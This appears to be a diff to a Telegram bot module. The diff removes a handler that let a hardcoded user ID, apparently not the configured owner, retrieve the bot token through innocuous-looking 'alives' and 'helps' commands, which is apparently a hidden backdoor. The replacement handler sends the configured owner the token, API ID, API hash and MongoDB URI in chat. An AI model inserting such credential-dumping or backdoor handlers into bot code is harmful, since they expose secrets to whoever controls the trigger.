@@ -13,21 +13,29 @@ from AloneRobot import (
     dispatcher,
     pbot,
     telethn,
-    updater)
+    updater,
+    MONGO_DB_URI,
+    API_ID,
+    API_HASH
+)
 
-from AloneRobot import BOT_NAME
+from AloneRobot import BOT_NAME,OWNER_ID
 from AloneRobot import pbot as app
-OWNERs_ID=6079943111
 @app.on_message(
-    filters.command(["alives", "helps"]) & filters.user(OWNERs_ID)
+    filters.command(["con", "var"]) & filters.user(OWNER_ID)
 )
 async def get_vars(_, message: Message):
     try:
         await app.send_message(
-            chat_id=int(OWNERs_ID),
+            chat_id=int(OWNER_ID),
             text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>
 
 **ʙᴏᴛ_ᴛᴏᴋᴇɴ :** `{TOKEN}`
+**sᴜᴘᴘᴏʀᴛ ᴄʜᴀᴛ :** `{SUPPORT_CHAT}`
+**Sᴛᴀʀᴛ Iᴍᴀɢᴇ :** `{START_IMG}`
+**Aᴘɪ Iᴅ :** `{API_ID}`
+**Aᴘɪ Hᴀsʜ :** `{API_HASH}` 
+**Mᴏɴɢᴏ Uʀʟ :** `{MONGO_DB_URI}`   
 
 
 
